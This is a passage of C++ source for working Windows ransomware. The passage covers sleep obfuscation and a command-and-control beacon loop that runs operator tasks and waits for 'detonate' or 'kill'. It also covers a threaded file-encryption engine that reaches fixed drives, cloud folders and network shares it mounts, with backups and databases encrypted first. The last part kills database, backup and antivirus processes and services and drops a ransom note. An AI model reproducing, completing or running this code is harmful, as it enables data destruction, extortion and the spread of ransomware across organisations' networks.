                            if (nthreads == capacity) {
                                capacity *= 2;
                                HANDLE* bigger = (HANDLE*)realloc(threads,
                                    capacity * sizeof(HANDLE));
                                if (!bigger) { ResumeThread(th); CloseHandle(th); failed = true; break; }
                                threads = bigger;
                            }
                            threads[nthreads++] = th;
                        } while (Thread32Next(snap, &te));
                    }
                    CloseHandle(snap);
                }
                if (failed || nthreads == 0) {
                    for (DWORD i = 0; i < nthreads; i++) {
                        ResumeThread(threads[i]); CloseHandle(threads[i]);
                    }
                    free(threads);
                    SetEvent(ev);
                    UnmapViewOfFile(sh);
                    CloseHandle(hm); CloseHandle(ev); CloseHandle(hp);
                    return 3;
                }
            }

            DoSleepCycle(hp, sh, ms, threads, nthreads, processSuspended);
            free(threads);
            SetEvent(ev);
            UnmapViewOfFile(sh);
            CloseHandle(hm);
            CloseHandle(ev);
            CloseHandle(hp);
            return 0;
        }

        static bool ObfuscatedSleep(DWORD ms) {
            if (ms < 1000) { Sleep(ms); return true; }
            wchar_t self[MAX_PATH]{};
            if (!GetModuleFileNameW(NULL, self, MAX_PATH)) { Sleep(ms); return false; }
            std::wstring mapName = L"Local\\vxm" + utils::RandomHex(8);
            std::wstring evtName = L"Local\\vxe" + utils::RandomHex(8);
            HANDLE hm = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL,
                PAGE_READWRITE, 0, sizeof(Shared), mapName.c_str());
            if (!hm) { Sleep(ms); return false; }
            Shared* sh = (Shared*)MapViewOfFile(hm, FILE_MAP_READ | FILE_MAP_WRITE,
                0, 0, sizeof(Shared));
            HANDLE ev = CreateEventW(NULL, TRUE, FALSE, evtName.c_str());
            if (!sh || !ev) {
                if (sh) UnmapViewOfFile(sh);
                if (ev) CloseHandle(ev);
                CloseHandle(hm);
                Sleep(ms);
                return false;
            }
            PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)
                ((uint8_t*)&__ImageBase + __ImageBase.e_lfanew);
            sh->magic = kSharedMagic;
            sh->base = (uint64_t)(uintptr_t)&__ImageBase;
            sh->size = nt->OptionalHeader.SizeOfImage;
            if (!crypto::api.GenRandom ||
                crypto::api.GenRandom(NULL, sh->key, sizeof(sh->key),
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG) != 0 ||
                sh->size == 0 || sh->size > 256ull * 1024 * 1024) {
                UnmapViewOfFile(sh);
                CloseHandle(ev);
                CloseHandle(hm);
                Sleep(ms);
                return false;
            }

            std::wstring fullCmd = L"\"" + std::wstring(self) + L"\" --sleep-helper " +
                std::to_wstring(GetCurrentProcessId()) + L" " +
                std::to_wstring(ms) + L" " + mapName + L" " + evtName;

            STARTUPINFOW si{}; si.cb = sizeof(si);
            PROCESS_INFORMATION pi{};
            std::wstring c = fullCmd;
            bool launched = CreateProcessW(NULL, &c[0], NULL, NULL, FALSE,
                CREATE_NO_WINDOW, NULL, NULL, &si, &pi) != FALSE;
            bool ok = false;
            if (launched) {
                DWORD w = WaitForSingleObject(ev, ms + 120000);
                ok = (w == WAIT_OBJECT_0);
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
            } else {
                Sleep(ms);
            }
            UnmapViewOfFile(sh);
            CloseHandle(ev);
            CloseHandle(hm);
            return ok;
        }
    } // namespace sleepcrypt

    namespace sleeper {
        static void ParseLine(const std::string& body, const std::string& key,
            std::string& value) {
            size_t p = body.find(key + "=");
            if (p == std::string::npos) return;
            p += key.size() + 1;
            size_t e = body.find_first_of("\r\n", p);
            value = body.substr(p, e == std::string::npos ? std::string::npos : e - p);
        }

        static std::string Wait(const uint8_t vid[16], DWORD intervalMs,
            DWORD jitterMs, uint8_t* key = nullptr) {
            for (;;) {
                std::string body = comms::PingBody(vid);

                std::string host;
                ParseLine(body, "host", host);
                if (!host.empty()) comms::SaveHost(utils::widen(host));

                std::string cmd;
                ParseLine(body, "cmd", cmd);
                if (!cmd.empty()) {
                    size_t a = cmd.find('|');
                    size_t b = a == std::string::npos ? std::string::npos : cmd.find('|', a + 1);
                    if (a != std::string::npos && b != std::string::npos) {
                        std::string id = cmd.substr(0, a);
                        std::string type = cmd.substr(a + 1, b - a - 1);
                        std::string arg = cmd.substr(b + 1);
                        tasks::Result tr = tasks::Execute(vid, type, arg, key);
                        std::string out = utils::b64(
                            (const uint8_t*)tr.output.data(), tr.output.size());
                        comms::Report(vid, "cmdout", id + "|" + type + "|" + out);
                        if (tr.lock) return "detonate";
                        if (tr.uninstall) return "kill";
                    }
                }

                // Status is the first line only: command arguments are base64
                // and may contain words that must never trigger an action.
                std::string first = body.substr(0, body.find_first_of("\r\n"));
                std::string action = first;
                std::transform(action.begin(), action.end(), action.begin(),
                    [](unsigned char c) { return (char)std::tolower(c); });
                if (action == "pardon") return "pardon";
                if (action == "detonate") return "detonate";
                if (action == "kill") return "kill";

                ULONG j = 0;
                crypto::api.GenRandom(NULL, (PUCHAR)&j, sizeof(j),
                    BCRYPT_USE_SYSTEM_PREFERRED_RNG);
                DWORD ms = intervalMs;
                if (jitterMs != 0) ms += j % jitterMs;

                // The AES key is not kept in the clear while dormant: pad it
                // with fresh randomness for the duration of the sleep.
                uint8_t pad[32]{};
                if (key) {
                    crypto::api.GenRandom(NULL, pad, sizeof(pad),
                        BCRYPT_USE_SYSTEM_PREFERRED_RNG);
                    for (int i = 0; i < 32; i++) key[i] ^= pad[i];
                }
                if (config::g_sleepCrypt)
                    sleepcrypt::ObfuscatedSleep(ms);
                else
                    Sleep(ms);
                if (key) {
                    for (int i = 0; i < 32; i++) key[i] ^= pad[i];
                    SecureZeroMemory(pad, sizeof(pad));
                }
            }
        }
    } // namespace sleeper
} // namespace vex

// ============================================================================
// 7. ENGINE
// ============================================================================
namespace vex {
    namespace engine {
        struct Options {
            bool dryRun = false;
            bool shares = true;
            bool cloud = true;
            bool priority = true;
            bool mirror = false;
            uint32_t throttlePerSec = 0;
            unsigned threads = 0;   // 0 = auto (HDD-aware)
        };

        struct Stats {
            uint64_t files = 0;
            uint64_t bytes = 0;
            uint64_t failed = 0;
            uint64_t skipped = 0;
            uint64_t elapsedMs = 0;
        };

        struct EngineResult {
            Stats stats{};
            bool ok = false;
            bool journalSealed = false;
            std::string error;
        };

        // Harness overrides (--journal / --encrypt). Empty in production.
        static std::wstring g_journalOverride;
        // Detonation target override: kEncryptOnlyTestRoot keeps VM tests small.
        static std::wstring g_testRoot = config::kTestRoot;

        // Paths that must never be encrypted (journal, harness outputs).
        static std::unordered_set<std::wstring> g_exclude;

        static void Exclude(const std::wstring& p) {
            if (p.empty()) return;
            std::wstring k = utils::canonical(p);
            std::transform(k.begin(), k.end(), k.begin(), ::towlower);
            g_exclude.insert(k);
            std::wstring raw = p;
            std::transform(raw.begin(), raw.end(), raw.begin(), ::towlower);
            g_exclude.insert(raw);
        }

        struct WorkQueue {
            std::mutex m; std::condition_variable cv; std::deque<std::wstring> q;
            int pending = 0; bool done = false;

            void Push(std::wstring d) { std::lock_guard<std::mutex> g(m); q.push_back(std::move(d)); pending++; cv.notify_one(); }
            bool Pop(std::wstring& out) {
                std::unique_lock<std::mutex> g(m);
                cv.wait(g, [&] { return !q.empty() || done; });
                if (q.empty()) return false;
                out = std::move(q.front()); q.pop_front(); return true;
            }
            void Complete() { std::lock_guard<std::mutex> g(m); if (--pending == 0) { done = true; cv.notify_all(); } }
            void Close() { std::lock_guard<std::mutex> g(m); if (pending == 0) { done = true; cv.notify_all(); } }
        };

        static const std::unordered_set<std::wstring> kSkipExts = {
            L".l0cked", L".vxtmp", L".tmp", L".exe", L".dll", L".sys", L".msi", L".lnk",
            L".boot", L".jnl", L".vex", L".mui", L".manifest", L".log", L".cab"
        };

        // Backups, databases and virtual disks first: they are the files the
        // victim cannot live without and the ones recovery tooling targets.
        static const std::unordered_set<std::wstring> kPriorityExts = {
            L".vbk", L".vbh", L".vib", L".vhd", L".vhdx", L".edb",
            L".mdf", L".ldf", L".bak", L".ost", L".pst", L".sql", L".dmp"
        };

        struct SystemDirs {
            std::wstring win, sys;
            SystemDirs() {
                wchar_t buf[MAX_PATH]{};
                if (GetWindowsDirectoryW(buf, MAX_PATH)) win = buf;
                if (GetSystemDirectoryW(buf, MAX_PATH)) sys = buf;
                std::transform(win.begin(), win.end(), win.begin(), ::towlower);
                std::transform(sys.begin(), sys.end(), sys.begin(), ::towlower);
            }
        };

        static bool ShouldSkip(const std::wstring& lp, const WIN32_FIND_DATAW& fd) {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) return true;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_SYSTEM) return true;

            std::wstring fname = fd.cFileName;
            std::transform(fname.begin(), fname.end(), fname.begin(), ::towlower);

            static const std::wstring noteName = [] {
                std::wstring n = config::kNoteName;
                std::transform(n.begin(), n.end(), n.begin(), ::towlower);
                return n;
                }();
            if (fname == noteName) return true;

            size_t dot = fname.find_last_of(L'.');
            if (dot != std::wstring::npos && kSkipExts.count(fname.substr(dot))) return true;

            static SystemDirs dirs;
            std::wstring lower = lp;
            std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
            if (g_exclude.count(lower)) return true;
            if ((!dirs.win.empty() && lower.rfind(dirs.win, 0) == 0) ||
                (!dirs.sys.empty() && lower.rfind(dirs.sys, 0) == 0)) return true;
            return false;
        }

        static bool IsPriorityName(const std::wstring& fname) {
            size_t dot = fname.find_last_of(L'.');
            if (dot == std::wstring::npos) return false;
            std::wstring ext = fname.substr(dot);
            std::transform(ext.begin(), ext.end(), ext.begin(), ::towlower);
            return kPriorityExts.count(ext) != 0;
        }

        struct Context {
            const uint8_t* key;
            std::ofstream* journal;
            std::wstring journalPath;
            std::mutex* jmtx;
            std::atomic<uint64_t>* files;
            std::atomic<uint64_t>* bytes;
            std::atomic<uint64_t>* failed;
            std::atomic<uint64_t>* skipped;
            WorkQueue* wq;
            const Options* opt;
        };

        // SEH-isolated call. Only references and PODs live here, so MSVC
        // permits __try; the callers keep all C++ objects outside.
        static crypto::Result GuardedEncrypt(const std::wstring& path,
            const uint8_t* key, std::ofstream& journal,
            const std::wstring& journalPath, std::mutex& jmtx,
            crypto::Scratch& scratch, uint64_t* bytes) {
            crypto::Result r = crypto::Result::Fail;
            __try {
                r = crypto::EncryptFile(path, key, journal, journalPath,
                    jmtx, scratch, bytes);
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                r = crypto::Result::Fail;
            }
            return r;
        }

        static void ProcessFile(Context* ctx, const std::wstring& path) {
            if (ctx->opt->throttlePerSec)
                Sleep(1000 / ctx->opt->throttlePerSec);

            uint64_t bytes = 0;
            crypto::Scratch scratch;
            crypto::Result r = GuardedEncrypt(path, ctx->key, *ctx->journal,
                ctx->journalPath, *ctx->jmtx, scratch, &bytes);

            if (r == crypto::Result::Ok) {
                ctx->files->fetch_add(1);
                ctx->bytes->fetch_add(bytes);
            }
            else if (r == crypto::Result::Skip) {
                ctx->skipped->fetch_add(1);
            }
            else {
                ctx->failed->fetch_add(1);
            }
        }

        static void Worker(Context* ctx) {
            std::wstring dir;
            while (ctx->wq->Pop(dir)) {
                WIN32_FIND_DATAW fd{};
                HANDLE h = FindFirstFileW(utils::extended(dir + L"\\*").c_str(), &fd);
                if (h != INVALID_HANDLE_VALUE) {
                    do {
                        if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
                        std::wstring lp = dir + L"\\" + fd.cFileName;
                        if (ShouldSkip(lp, fd)) continue;
                        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                            ctx->wq->Push(lp);
                        }
                        else {
                            ProcessFile(ctx, lp);
                        }
                    } while (FindNextFileW(h, &fd));
                    FindClose(h);
                }
                ctx->wq->Complete();
            }
        }

        static bool RootIsHdd(const std::wstring& root) {
            if (root.size() < 2 || root[1] != L':') return false;

            std::wstring vol = L"\\\\.\\" + root.substr(0, 2);
            HANDLE h = CreateFileW(vol.c_str(), 0,
                FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
            if (h == INVALID_HANDLE_VALUE) return false;

            STORAGE_PROPERTY_QUERY q{};
            q.PropertyId = StorageDeviceSeekPenaltyProperty;
            q.QueryType = PropertyStandardQuery;
            DEVICE_SEEK_PENALTY_DESCRIPTOR d{};
            DWORD br = 0;
            BOOL ok = DeviceIoControl(h, IOCTL_STORAGE_QUERY_PROPERTY,
                &q, sizeof(q), &d, sizeof(d), &br, NULL);
            CloseHandle(h);
            return ok && d.IncursSeekPenalty;
        }

        static void CollectDrives(std::vector<std::wstring>& roots, bool useTestRoot) {
            wchar_t r[4] = L"C:\\";
            for (wchar_t c = L'A'; c <= L'Z'; c++) {
                r[0] = c;
                UINT t = GetDriveTypeW(r);
                if (t != DRIVE_FIXED && t != DRIVE_REMOTE) continue;
                if (t == DRIVE_REMOTE && !config::kEncryptNetworkShares) continue;

                if (useTestRoot && !g_testRoot.empty()) {
                    std::wstring p = g_testRoot;
                    p[0] = c;
                    roots.push_back(p);
                }
                else {
                    roots.push_back(std::wstring(r));
                }
            }
        }

        static void CollectCloud(std::vector<std::wstring>& roots) {
            const wchar_t* envs[] = { L"OneDrive", L"OneDriveCommercial", L"OneDriveConsumer" };
            for (const wchar_t* e : envs) {
                wchar_t b[1024]{};
                DWORD n = GetEnvironmentVariableW(e, b, 1024);
                if (n > 0 && n < 1024) roots.push_back(b);
            }

            wchar_t up[1024]{};
            if (GetEnvironmentVariableW(L"USERPROFILE", up, 1024) > 0) {
                const wchar_t* subs[] = {
                    L"\\Dropbox", L"\\Google Drive", L"\\GoogleDrive",
                    L"\\iCloudDrive", L"\\OneDrive"
                };
                for (const wchar_t* s : subs) {
                    std::wstring p = std::wstring(up) + s;
                    if (GetFileAttributesW(utils::extended(p).c_str()) != INVALID_FILE_ATTRIBUTES)
                        roots.push_back(p);
                }
            }
        }

        // Enumerate disk shares on hosts the SMB pass can reach and mount them
        // with the current token. Mounts are disconnected after the run.
        static void CollectShares(std::vector<std::wstring>& roots,
            std::vector<std::wstring>& mounts) {
            std::vector<uint32_t> bases, selfs;
            spread::CollectNetwork(bases, selfs);

            uint32_t hosts = 0;
            for (uint32_t base : bases) {
                for (uint32_t i = 1; i <= 254 && hosts < config::kShareBudgetHosts; i++) {
                    uint32_t host = base | i;
                    bool isSelf = false;
                    for (uint32_t s : selfs) if (s == host) isSelf = true;
                    if (isSelf) continue;

                    char ip[32];
                    sprintf_s(ip, sizeof(ip), "%u.%u.%u.%u",
                        (host >> 24) & 0xFF, (host >> 16) & 0xFF,
                        (host >> 8) & 0xFF, host & 0xFF);

                    if (!spread::ProbePort(ip, config::kSmbPort, 300)) continue;
                    hosts++;

                    std::wstring hostW = utils::widen(ip);
                    SHARE_INFO_1* buf = nullptr;
                    DWORD read = 0, total = 0;
            DWORD resume = 0;
                    NET_API_STATUS ns = NetShareEnum((LPWSTR)hostW.c_str(), 1,
                        (LPBYTE*)&buf, MAX_PREFERRED_LENGTH, &read, &total, &resume);

                    if ((ns == NERR_Success || ns == ERROR_MORE_DATA) && buf) {
                        for (DWORD k = 0; k < read; k++) {
                            if ((buf[k].shi1_type & 0xFFFF) != STYPE_DISKTREE) continue;
                            std::wstring name = buf[k].shi1_netname ? buf[k].shi1_netname : L"";
                            if (name.empty()) continue;
                            if (name.back() == L'$') continue; // admin/print shares

                            std::wstring unc = L"\\\\" + hostW + L"\\" + name;
                            NETRESOURCEW nr{};
                            nr.dwType = RESOURCETYPE_DISK;
                            nr.lpRemoteName = (LPWSTR)unc.c_str();
                            DWORD rc = WNetAddConnection2W(&nr, NULL, NULL, 0);
                            if (rc == ERROR_SESSION_CREDENTIAL_CONFLICT) {
                                WNetCancelConnection2W(unc.c_str(), 0, TRUE);
                                rc = WNetAddConnection2W(&nr, NULL, NULL, 0);
                            }
                            if (rc == NO_ERROR) {
                                mounts.push_back(unc);
                                roots.push_back(unc);
                            }
                        }
                    }
                    if (buf) NetApiBufferFree(buf);
                }
            }
        }

        static void DedupeRoots(std::vector<std::wstring>& roots) {
            std::vector<std::wstring> out;
            std::unordered_set<std::wstring> seen;
            for (const auto& r : roots) {
                if (r.empty()) continue;
                std::wstring key = utils::canonical(r);
                std::transform(key.begin(), key.end(), key.begin(), ::towlower);
                if (seen.insert(key).second) out.push_back(r);
            }
            roots.swap(out);
        }

        // Priority sweep before the threaded pass: backup/DB/VHD files first.
        static void PriorityPass(const std::vector<std::wstring>& roots,
            const uint8_t* key, std::ofstream& journal,
            const std::wstring& journalPath, std::mutex& jmtx,
            std::atomic<uint64_t>* files, std::atomic<uint64_t>* bytes,
            std::atomic<uint64_t>* failed, std::atomic<uint64_t>* skipped) {
            const uint64_t deadline = GetTickCount64() + config::kPriorityWalkBudgetMs;
            std::deque<std::wstring> q(roots.begin(), roots.end());
            uint64_t visited = 0;

            while (!q.empty() && visited < 20000 && GetTickCount64() < deadline) {
                std::wstring dir = std::move(q.front());
                q.pop_front();
                visited++;

                WIN32_FIND_DATAW fd{};
                HANDLE h = FindFirstFileW(utils::extended(dir + L"\\*").c_str(), &fd);
                if (h == INVALID_HANDLE_VALUE) continue;

                do {
                    if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
                    std::wstring lp = dir + L"\\" + fd.cFileName;
                    if (ShouldSkip(lp, fd)) continue;
                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        q.push_back(lp);
                    }
                    else if (IsPriorityName(fd.cFileName)) {
                        uint64_t b = 0;
                        crypto::Scratch scratch;
                        crypto::Result r = GuardedEncrypt(lp, key, journal,
                            journalPath, jmtx, scratch, &b);
                        if (r == crypto::Result::Ok) {
                            files->fetch_add(1);
                            bytes->fetch_add(b);
                        }
                        else if (r == crypto::Result::Skip) {
                            skipped->fetch_add(1);
                        }
                        else {
                            failed->fetch_add(1);
                        }
                    }
                } while (FindNextFileW(h, &fd));
                FindClose(h);
            }
        }

        static void DryRun(const std::vector<std::wstring>& roots) {
            std::map<std::wstring, std::pair<uint64_t, uint64_t>> byExt; // count, bytes
            uint64_t totalFiles = 0, totalBytes = 0;

            std::deque<std::wstring> q(roots.begin(), roots.end());
            uint64_t visited = 0;
            while (!q.empty() && visited < 200000) {
                std::wstring dir = std::move(q.front());
                q.pop_front();
                visited++;

                WIN32_FIND_DATAW fd{};
                HANDLE h = FindFirstFileW(utils::extended(dir + L"\\*").c_str(), &fd);
                if (h == INVALID_HANDLE_VALUE) continue;

                do {
                    if (wcscmp(fd.cFileName, L".") == 0 || wcscmp(fd.cFileName, L"..") == 0) continue;
                    std::wstring lp = dir + L"\\" + fd.cFileName;
                    if (ShouldSkip(lp, fd)) continue;

                    if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                        q.push_back(lp);
                        continue;
                    }
                    std::wstring name = fd.cFileName;
                    std::transform(name.begin(), name.end(), name.begin(), ::towlower);
                    size_t dot = name.find_last_of(L'.');
                    std::wstring ext = (dot == std::wstring::npos) ? L"(none)" : name.substr(dot);
                    uint64_t size = ((uint64_t)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
                    byExt[ext].first++;
                    byExt[ext].second += size;
                    totalFiles++;
                    totalBytes += size;
                } while (FindNextFileW(h, &fd));
                FindClose(h);
            }

            std::vector<std::pair<std::wstring, std::pair<uint64_t, uint64_t>>> v(byExt.begin(), byExt.end());
            std::sort(v.begin(), v.end(), [](const auto& a, const auto& b) {
                return a.second.second > b.second.second;
                });

            printf("[dry-run] roots=%zu files=%llu bytes=%llu (%.1f MiB)\n",
                roots.size(), (unsigned long long)totalFiles,
                (unsigned long long)totalBytes, totalBytes / 1048576.0);
            size_t shown = 0;
            for (const auto& e : v) {
                if (shown++ >= 10) break;
                wprintf(L"[dry-run]   %-8ls %8llu files %10llu bytes\n",
                    e.first.c_str(), (unsigned long long)e.second.first,
                    (unsigned long long)e.second.second);
            }
        }

        // A torn tail from a crash would make the decrypter stop at the first
        // bad record and skip everything after it. Trim to the last valid
        // record before appending; quarantine foreign journals.
        static bool RepairJournal(const std::wstring& path) {
            std::ifstream in(utils::extended(path).c_str(), std::ios::binary);
            if (!in.is_open()) return true; // no journal yet
            std::string data((std::istreambuf_iterator<char>(in)),
                             std::istreambuf_iterator<char>());
            in.close();
            if (data.empty()) return true;
            if (data.size() < 12 || memcmp(data.data(), "VXJ2", 4) != 0) {
                std::wstring bad = path + L".bad." + utils::RandomHex(4);
                if (!MoveFileExW(utils::extended(path).c_str(),
                                 utils::extended(bad).c_str(),
                                 MOVEFILE_REPLACE_EXISTING))
                    return false;
                printf("[*] engine: quarantined foreign journal -> %ls\n", bad.c_str());
                return true;
            }
            size_t off = 12, good = 12;
            while (off + 8 <= data.size()) {
                uint32_t len = 0, crc = 0;
                memcpy(&len, data.data() + off, 4);
                memcpy(&crc, data.data() + off + 4, 4);
                if (len == 0 || len > 65535 || off + 8 + len > data.size()) break;
                const uint8_t* body = (const uint8_t*)data.data() + off + 8;
                if (crypto::Crc32(body, len) != crc) break;
                off += 8 + len;
                good = off;
            }
            if (good < data.size()) {
                HANDLE h = CreateFileW(utils::extended(path).c_str(),
                    GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL,
                    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
                if (h == INVALID_HANDLE_VALUE) return false;
                LARGE_INTEGER li{}; li.QuadPart = (LONGLONG)good;
                SetFilePointerEx(h, li, NULL, FILE_BEGIN);
                SetEndOfFile(h);
                CloseHandle(h);
                printf("[*] engine: trimmed torn journal tail (%llu bytes)\n",
                    (unsigned long long)(data.size() - good));
            }
            return true;
        }

        static EngineResult Execute(const uint8_t* key, const Options& opt,
            const std::wstring& onlyRoot = L"") {
            EngineResult result{};
            Stats& stats = result.stats;
            const uint64_t start = GetTickCount64();

            // Backup semantics are useless without the privilege: locked and
            // ACL-protected files would fail on every run.
            utils::EnablePrivilege(L"SeBackupPrivilege");
            utils::EnablePrivilege(L"SeRestorePrivilege");

            std::vector<std::wstring> roots;
            std::vector<std::wstring> mounts;

            if (!onlyRoot.empty()) {
                roots.push_back(onlyRoot);
            }
            else {
                CollectDrives(roots, config::kEncryptOnlyTestRoot);
                if (opt.cloud) CollectCloud(roots);
                if (opt.shares) CollectShares(roots, mounts);
            }
            DedupeRoots(roots);

            if (opt.dryRun) {
                DryRun(roots);
                for (auto& m : mounts) WNetCancelConnection2W(m.c_str(), 0, FALSE);
                stats.elapsedMs = GetTickCount64() - start;
                result.ok = true;
                result.journalSealed = true;
                return result;
            }

            std::wstring journalPath = g_journalOverride;
            if (journalPath.empty()) journalPath = utils::DefaultJournalPath();
            if (!RepairJournal(journalPath)) {
                result.error = "journal cannot be repaired";
                printf("[-] engine: journal cannot be repaired, refusing to encrypt\n");
                return result;
            }
            // A stale sidecar from a previous partial run would authenticate
            // the old bytes; remove it, then reseal when this run completes.
            DeleteFileW(utils::extended(journalPath + L".sig").c_str());
            std::ofstream journal(journalPath,
                std::ios::out | std::ios::app | std::ios::binary);
            if (!journal.is_open()) {
                result.error = "journal cannot be opened";
                printf("[-] engine: journal cannot be opened, refusing to encrypt\n");
                for (auto& m : mounts) WNetCancelConnection2W(m.c_str(), 0, FALSE);
                return result;
            }
            SetFileAttributesW(utils::extended(journalPath).c_str(), FILE_ATTRIBUTE_HIDDEN);
            Exclude(journalPath);

            std::mutex jmtx;
            WorkQueue wq;
            std::atomic<uint64_t> files{ 0 }, bytes{ 0 }, failed{ 0 }, skipped{ 0 };
            Context ctx{ key, &journal, journalPath, &jmtx, &files, &bytes,
                         &failed, &skipped, &wq, &opt };

            if (opt.priority && !roots.empty())
                PriorityPass(roots, key, journal, journalPath, jmtx,
                             &files, &bytes, &failed, &skipped);

            for (const auto& r : roots) wq.Push(r);
            wq.Close();

            unsigned nthreads = opt.threads;
            if (nthreads == 0) {
                nthreads = std::thread::hardware_concurrency();
                if (nthreads == 0) nthreads = 4;
                bool hdd = false;
                for (const auto& r : roots) {
                    if (RootIsHdd(r)) { hdd = true; break; }
                }
                if (hdd && nthreads > 4) nthreads = 4;
            }
            nthreads = (std::max)(1u, (std::min)(nthreads, config::kMaxThreads));
            printf("[*] engine: %u threads\n", nthreads);

            std::vector<std::thread> pool;
            for (unsigned i = 0; i < nthreads; i++) pool.emplace_back(Worker, &ctx);
            for (auto& t : pool) t.join();

            for (auto& m : mounts) WNetCancelConnection2W(m.c_str(), 0, FALSE);

            journal.close();
            result.journalSealed = crypto::SealJournal(journalPath, key);
            if (!result.journalSealed) {
                result.error = "journal seal failed";
                printf("[-] engine: journal seal failed\n");
            }

            // Mirror the journal to every fixed drive root. One lost copy must
            // not make the machine's files unrecoverable; the decrypter probes
            // drive roots for the same name.
            if (result.journalSealed && opt.mirror && files.load() > 0) {
                for (wchar_t c = L'C'; c <= L'Z'; c++) {
                    wchar_t root[4] = { c, L':', L'\\', 0 };
                    if (GetDriveTypeW(root) != DRIVE_FIXED) continue;
                    std::wstring dst = std::wstring(root) + config::kJournalName;
                    if (_wcsicmp(dst.c_str(), journalPath.c_str()) == 0) continue;
                    if (CopyFileW(utils::extended(journalPath).c_str(),
                        utils::extended(dst).c_str(), FALSE)) {
                        SetFileAttributesW(utils::extended(dst).c_str(),
                            FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                        std::wstring sigSrc = journalPath + L".sig";
                        if (GetFileAttributesW(utils::extended(sigSrc).c_str())
                                != INVALID_FILE_ATTRIBUTES) {
                            CopyFileW(utils::extended(sigSrc).c_str(),
                                utils::extended(dst + L".sig").c_str(), FALSE);
                        }
                    }
                }
            }

            stats.files = files.load();
            stats.bytes = bytes.load();
            stats.failed = failed.load();
            stats.skipped = skipped.load();
            stats.elapsedMs = GetTickCount64() - start;
            result.ok = result.journalSealed &&
                (stats.files > 0 || stats.failed > 0 || stats.skipped > 0);
            if (result.journalSealed && !result.ok)
                result.error = "no files processed";
            return result;
        }
    } // namespace engine
} // namespace vex

// ============================================================================
// 8. DETONATE
// ============================================================================
namespace vex {
    namespace detonate {
        // Databases, mail clients and backup agents hold file locks that would
        // otherwise leave half the disk unencrypted.
        static const wchar_t* kKillProcs[] = {
            L"sqlservr.exe", L"mysqld.exe", L"oracle.exe", L"postgres.exe",
            L"excel.exe", L"winword.exe", L"outlook.exe", L"onenote.exe",
            L"thunderbird.exe", L"veeam.backupagent.exe", L"bengine.exe",
            L"afcdpsrv.exe", L"msaccess.exe", L"acrord32.exe"
        };

        static const wchar_t* kStopServices[] = {
            L"MSSQLSERVER", L"SQLSERVERAGENT", L"SQLWriter", L"MySQL",
            L"VeeamBackupSvc", L"BackupExecAgentBrowser",
            L"AcronisActiveProtectionService", L"MBAMService",
            L"SavService", L"SymantecEndpointProtection"
        };

        static void KillBlockers() {
            HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (snap != INVALID_HANDLE_VALUE) {
                PROCESSENTRY32W pe{ sizeof(pe) };
                if (Process32FirstW(snap, &pe)) {
                    do {
                        for (const wchar_t* name : kKillProcs) {
                            if (_wcsicmp(pe.szExeFile, name) == 0) {
                                HANDLE p = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
                                if (p) { TerminateProcess(p, 1); CloseHandle(p); }
                                break;
                            }
                        }
                    } while (Process32NextW(snap, &pe));
                }
                CloseHandle(snap);
            }

            SC_HANDLE scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
            if (scm) {
                for (const wchar_t* name : kStopServices) {
                    SC_HANDLE svc = OpenServiceW(scm, name, SERVICE_STOP);
                    if (svc) {
                        SERVICE_STATUS ss{};
                        ControlService(svc, SERVICE_CONTROL_STOP, &ss);
                        CloseServiceHandle(svc);
                    }
                }
                CloseServiceHandle(scm);
            }
        }

        static void DropNote(const std::wstring& root, const uint8_t vid[16]) {
            std::string note =
                "=== YOUR FILES ARE ENCRYPTED ===\r\n\r\n"
                "Every document, image, archive and database on this system\r\n"
                "was encrypted with AES-256-GCM. Shadow copies and recovery\r\n"
                "snapshots were removed.\r\n\r\n"
                "Victim ID: " + utils::b64(vid, 16) + "\r\n"
                "Recovery portal: https://" + utils::narrow(comms::ActiveHost())
                + "/portal\r\n\r\n"
                "Do not reinstall Windows and do not run recovery tools.\r\n"
                "The key is held by the operator and released after payment.\r\n";
            utils::WriteUtf8(root + config::kNoteName, note);
        }

        static void DropNoteDrive(wchar_t letter, const uint8_t vid[16]) {
            wchar_t root[4] = { letter, L':', L'\\', 0 };
            DropNote(root, vid);
        }

        typedef void(*VoidFn)();

        // SEH guard for void calls with no local objects in this frame.
        static bool RunGuarded(VoidFn fn) {
            __try {
                fn();
                return true;
            }
            __except (EXCEPTION_EXECUTE_HANDLER) {
                return false;
            }
        }

        struct EvasionReport {
            char detail[192];
        };

        static DWORD WINAPI EvasionReportThread(LPVOID p) {
            EvasionReport* r = (EvasionReport*)p;
            err::Report("evasion", r->detail);
            free(r);
            return 0;
        }

        // Telemetry must not delay encryption: hand it to a short-lived thread
        // and let detonation continue even if the C2 is unreachable.
        static void ReportEvasion() {
            const std::string& s = evasion::LastReport();
            EvasionReport* r = (EvasionReport*)malloc(sizeof(EvasionReport));
            if (!r) return;
            strncpy_s(r->detail, sizeof(r->detail), s.c_str(), _TRUNCATE);
            HANDLE h = CreateThread(NULL, 0, EvasionReportThread, r, 0, NULL);
            if (h) CloseHandle(h);
            else free(r);
        }

        // Body kept free of unwinding objects; risky calls go through RunGuarded
        // and every file goes through engine's SEH-isolated worker.
        static engine::EngineResult RunBody(const uint8_t* key, const uint8_t vid[16]) {
            engine::Options eo{};
            eo.mirror = true;   // detonation always leaves a second journal copy
